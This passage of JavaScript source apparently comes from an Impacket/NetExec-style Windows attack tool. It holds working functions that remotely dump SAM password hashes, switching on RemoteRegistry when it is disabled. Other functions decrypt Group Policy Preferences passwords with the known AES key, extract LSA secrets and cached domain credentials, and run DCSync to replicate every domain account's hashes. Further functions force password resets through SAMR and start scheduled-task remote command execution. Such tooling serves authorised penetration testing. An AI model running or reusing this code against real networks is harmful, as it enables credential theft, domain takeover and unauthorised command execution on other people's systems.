}

function lsaSha256Key(key, salt, rounds = 1000) {
  // Impacket: sha256(key || salt*rounds) — key prepended ONCE, salt repeated N times.
  const input = new Uint8Array(key.length + rounds * salt.length);
  input.set(key, 0);
  for (let i = 0; i < rounds; i++) input.set(salt, key.length + i * salt.length);
  return sha256(input);
}

function aesCbcDecrypt(key, iv, data) {
  const aes = new Aes(key);
  const blocks = Math.ceil(data.length / 16);
  const out = new Uint8Array(blocks * 16);
  let prev = iv;
  for (let i = 0; i < blocks; i++) {
    const block = data.slice(i * 16, (i + 1) * 16);
    if (block.length < 16) { const padded = new Uint8Array(16); padded.set(block); block.set ? null : 0; }
    const dec = aes.decryptBlock(data.slice(i * 16, Math.min((i + 1) * 16, data.length)).length === 16 ? data.slice(i * 16, (i + 1) * 16) : (() => { const p = new Uint8Array(16); p.set(data.slice(i * 16)); return p; })());
    for (let j = 0; j < 16; j++) out[i * 16 + j] = dec[j] ^ prev[j];
    prev = data.slice(i * 16, (i + 1) * 16);
  }
  return out;
}

function toHexSmb(buf) {
  return Array.from(buf, b => b.toString(16).padStart(2, '0')).join('');
}

// Start RemoteRegistry, flipping the service out of DISABLED when necessary
// (default on Windows 10). Returns a restore token so the caller can put the
// service back to how it found it — or null if nothing had to change.
async function startRemoteRegistry(c, host, log) {
  let restore = null;
  await withPipe(c, host, 'svcctl', async (tx) => {
    const svc = new Svcctl(tx);
    await svc.bind();
    const scm = await svc.openSCManager(host);
    const handle = await svc.openService(scm, 'RemoteRegistry', 0x0002003f);
    try {
      const cfg = await svc.queryServiceConfig(handle);
      const status = await svc.queryServiceStatus(handle);
      if (status === SERVICE_STATE.RUNNING) return;
      restore = { origStartType: cfg.startType, wasRunning: false };
      if (cfg.startType === SERVICE_START.DISABLED) {
        await svc.changeServiceConfig(handle, SERVICE_TYPE_NO_CHANGE, SERVICE_START.DEMAND);
      }
      await svc.startService(handle);
      for (let i = 0; i < 20; i++) {
        const s = await svc.queryServiceStatus(handle);
        if (s === SERVICE_STATE.RUNNING) break;
        await new Promise(r => setTimeout(r, 500));
      }
    } finally {
      await svc.closeHandle(handle);
      await svc.closeHandle(scm);
    }
  });
  await new Promise(r => setTimeout(r, 500));
  return restore;
}

async function restoreRemoteRegistry(c, host, restore) {
  if (!restore) return;
  try {
    await withPipe(c, host, 'svcctl', async (tx) => {
      const svc = new Svcctl(tx);
      await svc.bind();
      const scm = await svc.openSCManager(host);
      const handle = await svc.openService(scm, 'RemoteRegistry', 0x0002003f);
      try {
        if (!restore.wasRunning) { try { await svc.stopService(handle); } catch {} }
        if (restore.origStartType !== undefined && restore.origStartType !== SERVICE_START.DEMAND) {
          try { await svc.changeServiceConfig(handle, SERVICE_TYPE_NO_CHANGE, restore.origStartType); } catch {}
        }
      } finally {
        await svc.closeHandle(handle);
        await svc.closeHandle(scm);
      }
    });
  } catch {}
}

// Errors that indicate the winreg pipe isn't up yet — RemoteRegistry stopped, timing out,
// or the pipe object doesn't exist on the target. Windows 10 in default configuration
// returns STATUS_OBJECT_NAME_NOT_FOUND (0xc0000034) because the service is set to
// Manual/Disabled and no one has opened the pipe yet.
const WINREG_PIPE_UNAVAILABLE = ['0xc00000ac', '0xc00000b5', '0xc0000034'];

async function withWinreg(c, host, log, fn) {
  try {
    return await withPipe(c, host, 'winreg', fn);
  } catch (e) {
    if (!WINREG_PIPE_UNAVAILABLE.some(code => e.message.includes(code))) throw e;
    log('info', 'smb', host, 'winreg', 'starting RemoteRegistry...');
    let restore;
    try {
      restore = await startRemoteRegistry(c, host, log);
    } catch (e2) {
      throw new Error('could not start RemoteRegistry: ' + e2.message);
    }
    try {
      for (let attempt = 0; attempt < 5; attempt++) {
        try {
          return await withPipe(c, host, 'winreg', fn);
        } catch (e3) {
          if (attempt === 4 || !WINREG_PIPE_UNAVAILABLE.some(code => e3.message.includes(code))) throw e3;
          await new Promise(r => setTimeout(r, 1000));
        }
      }
    } finally {
      await restoreRemoteRegistry(c, host, restore);
    }
  }
}

export async function smbSamDump(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withWinreg(c, host, log, async (tx, read) => {
        const reg = new Winreg(tx, read);
        await reg.bind();

        const hklm = await reg.openLocalMachine();

        // Get current control set
        let csNum = 1;
        try {
          const selectKey = await reg.openKey(hklm, 'SYSTEM\\Select');
          const { data: currentData } = await reg.queryValue(selectKey, 'Current');
          csNum = new DataView(currentData.buffer, currentData.byteOffset).getUint32(0, true);
          await reg.closeKey(selectKey);
        } catch { /* default to ControlSet001 */ }
        const csPath = `SYSTEM\\ControlSet00${csNum}\\Control\\Lsa`;

        // Extract bootkey from class names
        const lsaKey = await reg.openKey(hklm, csPath);
        const bootParts = [];
        for (const subName of ['JD', 'Skew1', 'GBG', 'Data']) {
          try {
            const subKey = await reg.openKey(lsaKey, subName);
            const className = await reg.queryInfoKey(subKey);
            bootParts.push(className);
            await reg.closeKey(subKey);
          } catch { bootParts.push(''); }
        }
        await reg.closeKey(lsaKey);

        const bootHex = bootParts.join('');
        if (bootHex.length < 32) throw new Error('could not extract bootkey (insufficient class data)');
        const rawBootkey = new Uint8Array(16);
        for (let i = 0; i < 16; i++) rawBootkey[i] = parseInt(bootHex.substr(i * 2, 2), 16);
        const bootkey = new Uint8Array(16);
        for (let i = 0; i < 16; i++) bootkey[i] = rawBootkey[BOOTKEY_SCRAMBLE[i]];
        log('ok', 'smb', host, 'bootkey', toHexSmb(bootkey));

        // Read SAM domain account F value
        const accountKey = await reg.openKey(hklm, 'SAM\\SAM\\Domains\\Account');
        const { data: fData } = await reg.queryValue(accountKey, 'F');
        const fDv = new DataView(fData.buffer, fData.byteOffset, fData.byteLength);
        const samRevision = fDv.getUint32(0, true);

        let hbootkey;
        if (samRevision >= 3 || fData.length > 0xA0) {
          // New format (Windows 10 1607+): AES-128-CBC
          const iv = fData.slice(0x78, 0x88);
          const encHbootkey = fData.slice(0x88, 0xA8);
          hbootkey = aesCbcDecrypt(bootkey, iv, encHbootkey).slice(0, 16);
        } else {
          // Old format: RC4(MD5(F[0x70:0x80] + QWERTY + bootkey + NUMERIC))
          const rc4Key = md5(concat([fData.slice(0x70, 0x80), SAM_QWERTY, bootkey, SAM_NUMERIC]));
          hbootkey = rc4(rc4Key, fData.slice(0x80, 0xA0)).slice(0, 16);
        }

        // Enumerate user RIDs
        const usersKey = await reg.openKey(hklm, 'SAM\\SAM\\Domains\\Account\\Users');
        const userResults = [];
        for (let idx = 0; idx < 10000; idx++) {
          const { name, status } = await reg.enumKey(usersKey, idx);
          if (status === 259) break; // ERROR_NO_MORE_ITEMS
          if (status !== 0) break;
          if (!/^[0-9A-Fa-f]{8}$/.test(name)) continue;
          const rid = parseInt(name, 16);
          if (rid < 500) continue;

          try {
            const userKey = await reg.openKey(usersKey, name);
            const { data: vData } = await reg.queryValue(userKey, 'V');
            await reg.closeKey(userKey);

            const vDv = new DataView(vData.buffer, vData.byteOffset, vData.byteLength);
            // Parse V value: username at offset 0x0C, NT hash at offset 0xA8
            const nameOff = vDv.getUint32(0x0C, true) + 0xCC;
            const nameLen = vDv.getUint32(0x10, true);
            let userName = '';
            for (let i = 0; i < nameLen / 2; i++) userName += String.fromCharCode(vDv.getUint16(nameOff + i * 2, true));

            const ntOff = vDv.getUint32(0xA8, true) + 0xCC;
            const ntLen = vDv.getUint32(0xAC, true);

            // SAM_HASH_AES layout: PekID(2) + Revision(2) + DataOffset(4) +
            // Salt(16) + Hash(16). Revision==2 → AES-CBC; Revision==1 → legacy RC4.
            let ntHash = EMPTY_NT;
            if (ntLen > 4) {
              const revision = vDv.getUint16(ntOff + 2, true);
              if (revision === 2 && ntLen >= 40) {
                const iv = vData.slice(ntOff + 8, ntOff + 24);
                const encHash = vData.slice(ntOff + 24, ntOff + ntLen);
                const obfuscated = aesCbcDecrypt(hbootkey, iv, encHash);
                ntHash = toHexSmb(desDeobfuscate(rid, obfuscated.slice(0, 16)));
              } else if (revision === 1 && ntLen >= 20) {
                const encHash = vData.slice(ntOff + 4, ntOff + 20);
                const rc4Key = md5(concat([hbootkey, new Uint8Array([rid & 0xFF, (rid >> 8) & 0xFF, (rid >> 16) & 0xFF, (rid >> 24) & 0xFF]), NT_PASSWORD_CONST]));
                const obfuscated = rc4(rc4Key, encHash);
                ntHash = toHexSmb(desDeobfuscate(rid, obfuscated));
              }
            }

            const entry = `${userName}:${rid}:aad3b435b51404eeaad3b435b51404ee:${ntHash}:::`;
            userResults.push({ name: userName, rid, nthash: ntHash });
            log('ok', 'smb', host, '', entry);
          } catch (userErr) {
            log('err', 'smb', host, `RID ${rid}`, userErr.message);
          }
        }
        await reg.closeKey(usersKey);
        await reg.closeKey(accountKey);
        await reg.closeKey(hklm);
        return userResults;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'sam-dump', e.message);
    return null;
  }
}

// --- GPP Passwords -----------------------------------------------------------

const GPP_AES_KEY = new Uint8Array([
  0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
  0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b,
]);

const GPP_XML_PATHS = [
  'Machine\\Preferences\\Groups\\Groups.xml',
  'Machine\\Preferences\\Services\\Services.xml',
  'Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml',
  'Machine\\Preferences\\DataSources\\DataSources.xml',
  'Machine\\Preferences\\Printers\\Printers.xml',
  'Machine\\Preferences\\Drives\\Drives.xml',
  'User\\Preferences\\Groups\\Groups.xml',
  'User\\Preferences\\Services\\Services.xml',
  'User\\Preferences\\ScheduledTasks\\ScheduledTasks.xml',
  'User\\Preferences\\DataSources\\DataSources.xml',
  'User\\Preferences\\Printers\\Printers.xml',
  'User\\Preferences\\Drives\\Drives.xml',
];

function gppDecrypt(cpassword) {
  let b64 = cpassword.replace(/-/g, '+').replace(/_/g, '/');
  while (b64.length % 4) b64 += '=';
  const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  const aes = new Aes(GPP_AES_KEY);
  const iv = new Uint8Array(16);
  const dec = aesCbcDecrypt(GPP_AES_KEY, iv, raw);
  const padLen = dec[dec.length - 1];
  const end = (padLen > 0 && padLen <= 16) ? dec.length - padLen : dec.length;
  let s = '';
  for (let i = 0; i + 1 < end; i += 2) s += String.fromCharCode(dec[i] | (dec[i + 1] << 8));
  return s;
}

function extractGppCreds(xmlText) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(xmlText, 'text/xml');
  const results = [];
  for (const el of doc.querySelectorAll('[cpassword]')) {
    const cp = el.getAttribute('cpassword');
    if (!cp) continue;
    const user = el.getAttribute('userName') || el.getAttribute('accountName') ||
                 el.getAttribute('runAs') || el.getAttribute('username') || '';
    try {
      const password = gppDecrypt(cp);
      results.push({ user, password });
    } catch {}
  }
  return results;
}

export async function smbGpp(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect('SYSVOL');
      const rootFid = await c.createFile(tid, '', { access: 0x00100081, disposition: 1, options: 0x00200021 });
      const rootEntries = await c.queryDirectory(tid, rootFid);
      await c.closeFile(tid, rootFid);

      const domainDir = rootEntries.find(e => e.name !== '.' && e.name !== '..' && e.size === 0);
      if (!domainDir) { log('err', 'smb', host, 'gpp', 'no domain directory in SYSVOL'); return null; }

      let policiesFid;
      try {
        policiesFid = await c.createFile(tid, `${domainDir.name}\\Policies`, { access: 0x00100081, disposition: 1, options: 0x00200021 });
      } catch { log('info', 'smb', host, 'gpp', 'no Policies directory'); return []; }
      const policyDirs = await c.queryDirectory(tid, policiesFid);
      await c.closeFile(tid, policiesFid);

      const allCreds = [];
      for (const pd of policyDirs) {
        if (pd.name === '.' || pd.name === '..') continue;
        if (!pd.name.startsWith('{')) continue;

        for (const xmlRel of GPP_XML_PATHS) {
          const fullPath = `${domainDir.name}\\Policies\\${pd.name}\\${xmlRel}`;
          try {
            const fid = await c.createFile(tid, fullPath, { access: 0x00120089, disposition: 1 });
            const data = await c.readFileAll(tid, fid);
            await c.closeFile(tid, fid);
            const xmlText = new TextDecoder('utf-8').decode(data);
            const found = extractGppCreds(xmlText);
            for (const f of found) {
              allCreds.push({ ...f, policy: pd.name, file: xmlRel });
              log('ok', 'smb', host, `GPP ${f.user}`, f.password);
            }
          } catch { /* file doesn't exist, skip */ }
        }
      }
      if (allCreds.length === 0) log('info', 'smb', host, 'gpp', 'no GPP passwords found');
      return allCreds;
    });
  } catch (e) {
    log('err', 'smb', host, 'gpp', e.message);
    return null;
  }
}

// --- LSA Secrets dump --------------------------------------------------------

function lsaDecryptRc4(key, encData) {
  if (encData.length < 60) return encData;
  const salt = encData.slice(28, 60);
  const blob = encData.slice(60);
  const rc4Key = md5(concat([key, salt]));
  return rc4(rc4Key, blob);
}

function decryptLsaSecret(lsaKey, rawData) {
  if (!rawData || rawData.length < 60) return null;
  // Outer LSA_SECRET: Version(4) + EncKeyID(16) + EncAlgorithm(4) + Flags(4) + EncryptedData(rest)
  const encData = rawData.slice(28);
  // Impacket Vista+: salt = first 32 bytes of EncryptedData, ciphertext = rest
  const salt = encData.slice(0, 32);
  const ct = encData.slice(32);
  const tmpKey = lsaSha256Key(lsaKey, salt);
  const decBlob = aesEcbDecrypt(tmpKey, ct);
  // LSA_SECRET_BLOB: Length(4) + Unknown(12) + Secret(Length bytes)
  const secretLen = new DataView(decBlob.buffer, decBlob.byteOffset).getUint32(0, true);
  if (secretLen > decBlob.length - 16 || secretLen === 0) return decBlob.slice(16);
  return decBlob.slice(16, 16 + secretLen);
}

export async function smbLsaDump(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withWinreg(c, host, log, async (tx, read) => {
        const reg = new Winreg(tx, read);
        await reg.bind();
        const hklm = await reg.openLocalMachine();

        let csNum = 1;
        try {
          const selectKey = await reg.openKey(hklm, 'SYSTEM\\Select');
          const { data: currentData } = await reg.queryValue(selectKey, 'Current');
          csNum = new DataView(currentData.buffer, currentData.byteOffset).getUint32(0, true);
          await reg.closeKey(selectKey);
        } catch {}
        const csPath = `SYSTEM\\ControlSet00${csNum}\\Control\\Lsa`;

        const lsaKey = await reg.openKey(hklm, csPath);
        const bootParts = [];
        for (const subName of ['JD', 'Skew1', 'GBG', 'Data']) {
          try {
            const subKey = await reg.openKey(lsaKey, subName);
            const className = await reg.queryInfoKey(subKey);
            bootParts.push(className);
            await reg.closeKey(subKey);
          } catch { bootParts.push(''); }
        }
        await reg.closeKey(lsaKey);

        const bootHex = bootParts.join('');
        if (bootHex.length < 32) throw new Error('could not extract bootkey');
        const rawBootkey = new Uint8Array(16);
        for (let i = 0; i < 16; i++) rawBootkey[i] = parseInt(bootHex.substr(i * 2, 2), 16);
        const bootkey = new Uint8Array(16);
        for (let i = 0; i < 16; i++) bootkey[i] = rawBootkey[BOOTKEY_SCRAMBLE[i]];
        log('ok', 'smb', host, 'bootkey', toHexSmb(bootkey));

        let lsaDecKey;
        try {
          const polKey = await reg.openKey(hklm, 'SECURITY\\Policy\\PolEKList');
          const { data: polData } = await reg.queryValue(polKey, '');
          await reg.closeKey(polKey);
          // Outer LSA_SECRET: Version(4) + EncKeyID(16) + EncAlgorithm(4) + Flags(4) + EncryptedData(rest)
          // Impacket Vista+: salt = first 32 bytes of EncryptedData; ciphertext = rest.
          //   tmpKey = SHA256(bootkey || salt*1000); plaintext = AES-256-ECB(tmpKey, ct).
          //   LSA_SECRET_BLOB: Length(4) + Unknown(12) + Secret(Length bytes); LSA key = Secret[52:84].
          const encData = polData.slice(28);
          const tmpKey = lsaSha256Key(bootkey, encData.slice(0, 32));
          const decBlob = aesEcbDecrypt(tmpKey, encData.slice(32));
          lsaDecKey = decBlob.slice(68, 100);
          log('ok', 'smb', host, 'lsa-key', toHexSmb(lsaDecKey.slice(0, 16)) + '...');
        } catch (e) {
          try {
            const polKey = await reg.openKey(hklm, 'SECURITY\\Policy\\PolSecretEncryptionKey');
            const { data: polData } = await reg.queryValue(polKey, '');
            await reg.closeKey(polKey);
            const decBlob = lsaDecryptRc4(bootkey, polData);
            lsaDecKey = decBlob.slice(12, 44);
            log('ok', 'smb', host, 'lsa-key (legacy)', toHexSmb(lsaDecKey.slice(0, 16)) + '...');
          } catch (e2) {
            throw new Error(`cannot decrypt LSA key: ${e.message} / ${e2.message}`);
          }
        }

        const secrets = [];
        try {
          const secretsKey = await reg.openKey(hklm, 'SECURITY\\Policy\\Secrets');
          for (let idx = 0; idx < 1000; idx++) {
            const { name, status } = await reg.enumKey(secretsKey, idx);
            if (status === 259) break;
            if (status !== 0) break;

            try {
              const sKey = await reg.openKey(secretsKey, `${name}\\CurrVal`);
              const { data: rawData } = await reg.queryValue(sKey, '');
              await reg.closeKey(sKey);

              const decrypted = decryptLsaSecret(lsaDecKey, rawData);
              if (!decrypted) continue;

              if (name === '$MACHINE.ACC') {
                const ntHash = md4(decrypted);
                log('ok', 'smb', host, `${name}`, `NT: ${toHexSmb(ntHash)}`);
                secrets.push({ name, ntHash: toHexSmb(ntHash), raw: toHexSmb(decrypted.slice(0, 32)) });
              } else if (name === 'DPAPI_SYSTEM') {
                const userKey = decrypted.slice(4, 24);
                const machineKey = decrypted.slice(24, 44);
                log('ok', 'smb', host, `${name} user`, toHexSmb(userKey));
                log('ok', 'smb', host, `${name} machine`, toHexSmb(machineKey));
                secrets.push({ name, userKey: toHexSmb(userKey), machineKey: toHexSmb(machineKey) });
              } else if (name === 'NL$KM') {
                log('ok', 'smb', host, `${name}`, toHexSmb(decrypted.slice(0, 16)) + '...');
                secrets.push({ name, key: toHexSmb(decrypted) });
              } else {
                // _SC_* service-account secrets and other machine-generated secrets are
                // typically 240-byte random UTF-16 strings that render as garbage. Only
                // decode as text when the result is mostly printable ASCII; otherwise
                // fall back to a short hex preview (impacket-style).
                let val = '';
                for (let i = 0; i + 1 < decrypted.length; i += 2) {
                  const c = decrypted[i] | (decrypted[i + 1] << 8);
                  if (c === 0) break;
                  val += String.fromCharCode(c);
                }
                const printable = val && [...val].every(ch => { const c = ch.charCodeAt(0); return c >= 0x20 && c < 0x7f; });
                if (!printable) val = toHexSmb(decrypted.slice(0, Math.min(64, decrypted.length)));
                log('ok', 'smb', host, name, val);
                secrets.push({ name, value: val });
              }
            } catch {}
          }
          await reg.closeKey(secretsKey);
        } catch (e) {
          log('warn', 'smb', host, 'secrets', e.message);
        }

        // Cached domain creds
        try {
          let nlkmKey = null;
          const nlkmSecret = secrets.find(s => s.name === 'NL$KM');
          if (nlkmSecret) {
            nlkmKey = new Uint8Array(nlkmSecret.key.length / 2);
            for (let i = 0; i < nlkmKey.length; i++) nlkmKey[i] = parseInt(nlkmSecret.key.substr(i * 2, 2), 16);
          }

          const cacheKey = await reg.openKey(hklm, 'SECURITY\\Cache');
          for (let i = 1; i <= 64; i++) {
            try {
              const { data: cacheData } = await reg.queryValue(cacheKey, `NL$${i}`);
              if (!cacheData || cacheData.length < 96) continue;

              const cdv = new DataView(cacheData.buffer, cacheData.byteOffset, cacheData.byteLength);
              const userLen = cdv.getUint16(0, true);
              const domLen = cdv.getUint16(2, true);
              if (userLen === 0) continue;

              // NL_RECORD: header fields span 0-64, IV(16)=64-80, CH(16)=80-96, EncryptedData=96+
              const iv = cacheData.slice(64, 80);
              const encPayload = cacheData.slice(96);

              if (nlkmKey && encPayload.length >= 16) {
                // Standard AES-128-CBC decrypt of the payload.
                // decData[:16] = DCC2 MD4 hash; username (UTF-16LE) begins at offset 0x48.
                const decData = aesCbcDecrypt(nlkmKey.slice(0, 16), iv, encPayload);
                const dcc2 = toHexSmb(decData.slice(0, 16));
                const userOff = 0x48;
                let user = '', domain = '';
                if (decData.length >= userOff + userLen + domLen) {
                  for (let j = 0; j + 1 < userLen; j += 2) user += String.fromCharCode(decData[userOff + j] | (decData[userOff + j + 1] << 8));
                  const padUser = (userLen + 3) & ~3;
                  const domOff = userOff + padUser;
                  for (let j = 0; j + 1 < domLen; j += 2) domain += String.fromCharCode(decData[domOff + j] | (decData[domOff + j + 1] << 8));
                }
                log('ok', 'smb', host, `cached ${domain}\\${user}`, `$DCC2$10240#${user.toLowerCase()}#${dcc2}`);
                secrets.push({ name: `NL$${i}`, user, domain, dcc2 });
              }
            } catch {}
          }
          await reg.closeKey(cacheKey);
        } catch {}

        await reg.closeKey(hklm);
        return secrets;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'lsa-dump', e.message);
    return null;
  }
}

// --- DCSync ------------------------------------------------------------------

// Enumerate domain user sAMAccountNames via SAMR. Best-effort — swallows
// errors and returns [] so the caller can fall back to another source.
async function enumDomainUsersViaSamr(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'samr', async (tx) => {
        const samr = new Samr(tx);
        await samr.bind();
        const sc = await samr.connect2(host);
        const domains = await samr.enumDomains(sc);
        const domainName = domains.find((d) => d !== 'Builtin') || domains[0];
        if (!domainName) return [];
        const domSid = await samr.lookupDomain(sc, domainName);
        if (!domSid) return [];
        const domHandle = await samr.openDomain(sc, domSid);
        const users = await samr.enumDomainUsers(domHandle);
        return users.map((u) => u.name).filter(Boolean);
      });
    });
  } catch (e) {
    log('warn', 'smb', host, 'dcsync', `samr enum failed: ${e.message}`);
    return [];
  }
}

async function doDcsync(drs, host, creds, log, targetUser, opts = {}) {
  const domain = creds.domain || 'WORKGROUP';

  // No user given → enumerate every domain account first (mirrors
  // impacket-secretsdump's default `-just-dc` behaviour). One `--dcsync USER`
  // still targets that user only.
  let users;
  if (targetUser) {
    users = [targetUser];
  } else {
    log('info', 'smb', host, 'dcsync', 'no user specified → dumping every domain account (SAMR-enumerated)');
    users = await enumDomainUsersViaSamr(host, creds, opts, log);
    if (!users.length) {
      log('err', 'smb', host, 'dcsync', 'could not enumerate users — pass a single name to --dcsync USER as a fallback');
      return null;
    }
    log('ok', 'smb', host, 'dcsync', `${users.length} account(s) enumerated — starting replication cycle…`);
  }

  const allEntries = [];
  for (const uname of users) {
    // Impacket calls DRSCrackNames to convert user → objectGUID, then passes
    // GUID-based DSNAME to DRSGetNCChanges with EXOP_REPL_OBJ. This is the
    // canonical flow for -just-dc / -just-dc-user style secret dumps.
    const upn = uname.includes('@') ? uname : `${uname}@${domain}`;
    let guidBytes;
    try {
      // formatOffered=8 (UPN), formatDesired=6 (DS_UNIQUE_ID_NAME → GUID)
      const results = await drs.crackNames(upn, 8, 6);
      if (!results.length || results[0].status !== 0) {
        log('warn', 'smb', host, 'dcsync', `${upn}: crackNames status ${results[0]?.status}`);
        continue;
      }
      const guidStr = results[0].name.replace(/[{}]/g, '');
      guidBytes = guidStringToBytes(guidStr);
    } catch (e) {
      log('warn', 'smb', host, 'dcsync', `${upn}: crackNames failed: ${e.message}`);
      continue;
    }

    try {
      const result = await drs.getNCChanges('', guidBytes);
      const attrs = result.attributes;

      // Server-returned ATTIDs use the server's schema prefix table indexes
      // (upper 16 bits). We match by low 16 bits (attribute local id) — the
      // request advertised our own PrefixTable but the reply uses the DC's.
      const byLocalId = {};
      for (const [attid, val] of Object.entries(attrs)) {
        byLocalId[parseInt(attid) & 0xFFFF] = val;
      }
      const samNameRaw = byLocalId[ATTID.SAM_ACCOUNT_NAME & 0xFFFF];
      const samName = samNameRaw ? parseSamAccountName(samNameRaw) : uname;
      const sidRaw = byLocalId[ATTID.OBJECT_SID & 0xFFFF];
      const rid = sidRaw ? extractRidFromSid(sidRaw) : 0;

      const unicodePwdEnc = byLocalId[ATTID.UNICODE_PWD & 0xFFFF];
      const dbcsPwdEnc = byLocalId[ATTID.DBCS_PWD & 0xFFFF];

      let ntHash = null, lmHash = null;
      if (unicodePwdEnc) {
        const dec = drs.decryptSecret(unicodePwdEnc);
        if (dec && dec.length >= 16) ntHash = desDeobfuscate(rid, dec.slice(0, 16));
      }
      if (dbcsPwdEnc) {
        const dec = drs.decryptSecret(dbcsPwdEnc);
        if (dec && dec.length >= 16) lmHash = desDeobfuscate(rid, dec.slice(0, 16));
      }

      const entry = formatDcsyncEntry(samName, rid, ntHash, lmHash);
      log('ok', 'smb', host, '', entry);
      allEntries.push({ name: samName, rid, ntHash: ntHash ? toHexSmb(ntHash) : null, lmHash: lmHash ? toHexSmb(lmHash) : null });
    } catch (e) {
      log('warn', 'smb', host, 'dcsync', `${upn}: ${e.message}`);
    }
  }
  if (allEntries.length && !targetUser) {
    log('ok', 'smb', host, 'dcsync', `done — ${allEntries.length}/${users.length} secrets replicated`);
  }
  return allEntries;
}

function guidStringToBytes(guidStr) {
  // "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" → 16 bytes, first 3 fields little-endian.
  const h = guidStr.replace(/-/g, '');
  const b = new Uint8Array(16);
  for (let i = 0; i < 16; i++) b[i] = parseInt(h.substr(i * 2, 2), 16);
  const out = new Uint8Array(16);
  out[0] = b[3]; out[1] = b[2]; out[2] = b[1]; out[3] = b[0];
  out[4] = b[5]; out[5] = b[4];
  out[6] = b[7]; out[7] = b[6];
  out.set(b.subarray(8), 8);
  return out;
}

const PIPE_UNAVAILABLE = ['0xc0000034', '0xc00000ac', '0xc00000b5'];

export async function smbDcsync(host, creds, opts, log, targetUser) {
  // Try named pipe first
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'drsuapi', async (tx) => {
        const drs = new Drsuapi(tx, c.sessionKey);
        await drs.bind();
        log('ok', 'smb', host, 'dcsync', 'DRSBind OK');
        return await doDcsync(drs, host, creds, log, targetUser, opts);
      });
    });
  } catch (e) {
    if (!PIPE_UNAVAILABLE.some(code => e.message.includes(code))) {
      log('err', 'smb', host, 'dcsync', e.message);
      return null;
    }
  }

  // Pipe not available — fall back to TCP RPC via endpoint mapper
  try {
    log('info', 'smb', host, 'dcsync', 'pipe unavailable, connecting via TCP RPC...');
    const rpcLog = (m) => log('info', 'smb', host, 'dcsync', m);
    const port = await epmLookup(host, DRSUAPI_UUID, '4.0', rpcLog);
    log('info', 'smb', host, 'dcsync', `DRSUAPI endpoint on port ${port}`);
    const rpc = new DceRpcTcp(rpcLog);
    await rpc.connect(host, port);
    try {
      const ntHash = parseNtHash(creds.hash);
      await rpc.bindAuth(DRSUAPI_UUID, '4.0', {
        user: creds.user,
        domain: creds.domain || opts.domain || '',
        password: creds.password,
        hash: ntHash,
      }, RPC_C_AUTHN_LEVEL_PKT_PRIVACY);
      const drs = new Drsuapi(rpc, rpc._exportedSessionKey);
      await drs.bind();
      log('ok', 'smb', host, 'dcsync', 'DRSBind OK (TCP RPC)');
      // Fetch the DC's NtdsDsaObjectGuid — required as uuidDsaObjDest.
      try {
        drs.dsaGuid = await drs.getDomainControllerInfo(creds.domain || 'WORKGROUP');
        log('info', 'smb', host, 'dcsync', 'got DC DSA GUID');
      } catch (e) {
        log('warn', 'smb', host, 'dcsync', `DRSDomainControllerInfo failed: ${e.message}`);
      }
      return await doDcsync(drs, host, creds, log, targetUser);
    } finally {
      await rpc.close();
    }
  } catch (e) {
    log('err', 'smb', host, 'dcsync', e.message);
    return null;
  }
}

// --- Force Password Change via SAMR -----------------------------------------

export async function smbPasswd(host, creds, opts, log, args) {
  if (!args || !args.includes(' ')) {
    log('err', 'smb', host, 'passwd', 'usage: --passwd USER NEWPASS');
    return null;
  }
  const spaceIdx = args.indexOf(' ');
  const targetUser = args.slice(0, spaceIdx);
  const newPassword = args.slice(spaceIdx + 1);
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'samr', async (tx) => {
        const samr = new Samr(tx);
        await samr.bind();
        const sc = await samr.connect2(host);
        const domains = await samr.enumDomains(sc);
        const domainName = domains.find(d => d !== 'Builtin') || domains[0];
        if (!domainName) throw new Error('no domain found');
        const domSid = await samr.lookupDomain(sc, domainName);
        if (!domSid) throw new Error(`cannot resolve domain ${domainName}`);
        const domHandle = await samr.openDomain(sc, domSid);
        const users = await samr.enumDomainUsers(domHandle);
        const target = users.find(u => u.name.toLowerCase() === targetUser.toLowerCase());
        if (!target) throw new Error(`user "${targetUser}" not found in domain ${domainName}`);
        log('info', 'smb', host, 'passwd', `found ${target.name} (RID ${target.rid})`);
        const userHandle = await samr.openUser(domHandle, target.rid);
        await samr.setPassword(userHandle, newPassword, c.sessionKey);
        log('ok', 'smb', host, 'passwd', `password changed for ${target.name}`);
        await samr.closeHandle(userHandle);
        await samr.closeHandle(domHandle);
        await samr.closeHandle(sc);
        return true;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'passwd', e.message);
    return null;
  }
}

// TSCH-based command execution (impacket atexec.py model).
// Server 2019+ requires RPC-level NTLMSSP sign+seal (PKT_PRIVACY) for
// SchRpcRegisterTask — a plain SMB-session-inherited bind is accepted but
// every subsequent REQUEST is rejected with nca_s_fault_access_denied (0x5).
// So we go straight to `bindAuth` (impacket's atexec.py sets the same auth
// level explicitly). If a target ever rejects PKT_PRIVACY we can add a
// downgrade path back to plain bind, but no current test host does.
export async function smbAtExec(host, creds, opts, log, command) {
  if (!command) { log('err', 'smb', host, 'atexec', 'no command specified'); return null; }
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const outFile = `C:\\Windows\\Temp\\nxc_${Math.random().toString(36).slice(2, 8)}`;
      const taskPath = `\\nxc_${Math.random().toString(36).slice(2, 8)}`;
      return await withPipe(c, host, 'atsvc', async (tx, rd, wr) => {
        const tsch = new Tsch(tx, rd, wr);
        await tsch.bindAuth({
          user: creds.user,
          domain: creds.domain || opts.domain || '',
          password: creds.password,
          hash: parseNtHash(creds.hash),
        });
        // TASK_CREATE (0x2) — impacket atexec.py uses exactly this.
